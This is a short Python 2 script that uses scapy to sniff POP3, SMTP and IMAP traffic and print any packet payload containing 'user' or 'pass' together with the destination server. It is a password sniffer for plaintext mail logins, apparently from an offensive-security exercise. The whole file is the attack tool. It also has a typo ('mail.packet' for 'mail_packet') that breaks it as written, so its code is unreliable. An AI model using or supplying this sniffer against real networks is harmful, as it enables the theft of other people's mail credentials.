#--*--coding:utf-8--*--

from scapy.all import *

def packet_callback(packet):
        mail_packet = str(packet[TCP].payload)
        if "user" in mail.packet.lower() or "pass" in mail_packet.lower():
                print "[*] Serveur: %s"%packet[IP].dst
                print "[*] %s"%packet[TCP].payload
sniff(filter="tcp port 110 or tcp port 25 or tcp port 143", prn=packet_callback,store=0)
